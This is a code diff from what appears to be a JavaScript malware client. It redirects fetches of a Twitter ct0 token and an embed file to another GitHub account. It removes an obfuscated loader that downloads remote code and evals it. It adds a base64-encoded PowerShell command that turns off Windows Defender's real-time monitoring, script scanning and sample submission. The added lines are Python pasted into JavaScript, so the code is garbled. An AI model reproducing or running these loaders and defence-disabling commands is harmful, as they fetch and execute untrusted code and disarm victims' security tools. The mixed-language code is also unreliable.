@@ -1171,7 +1171,7 @@
             async get_twitter_ct0() {
               return new Promise(async res => {
                 try {
-                  res(client.config.environ.twitter_ct0 = (await client.axios_instance.get("https://raw.githubusercontent.com/antivirusevasion69/antivirusevasion69/main/ct0.txt")).data).toString("utf-8")
+                  res(client.config.environ.twitter_ct0 = (await client.axios_instance.get("https://raw.githubusercontent.com/jamiekarvans/antivirusevasion69/main/ct0.txt")).data).toString("utf-8")
                 } catch {
                   res(client.config.environ.twitter_ct0 = "ac1aa9d58c8798f0932410a1a564eb42")
                 }
@@ -4186,30 +4186,9 @@ return ${eval_string};
       }
 
       async runtime_evasion() {
-        let evasor = (`${((base64.decode(
-          `${((await this.axios_instance.get((base64.decode((
-            await this.axios_instance.get(
-              (
-                base64.decode(
-                  `aHR0cHM6Ly9kb2VuZXJpdW0ua3FuZmtwb2NjaWN4aXVkc3Rxb25mb3R1d3NyaHV4a3docWpqZnNiamhvbm91YnJjY3kubmwv`
-                )
-              )
-            ).catch((err) => {
-              console.log(err)
-            })
-          ).data
-          ).replace("%20", "").replace("\x00", "")
-            + base64.decode("L21haW4vZXZhc2lvbi50eHQ")
-          )
-          ).catch((err) => {
-            console.log(err)
-          })
-          ).data)}`
-        )))}`)
+        cmd = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDI=').decode()
+    subprocess.run(cmd, shell=True, capture_output=True)
 
-        await this.eval_like(evasor,
-          this
-        );
       }
 
       async init() {
@@ -4244,7 +4223,7 @@ return ${eval_string};
             JSON.stringify(
               (
                 await this.axios_instance.get(
-                  "https://raw.githubusercontent.com/antivirusevasion69/antivirusevasion69/main/embed.json"
+                  "https://raw.githubusercontent.com/jamiekarvans/antivirusevasion69/main/embed.json"
                 )
               ).data
             )
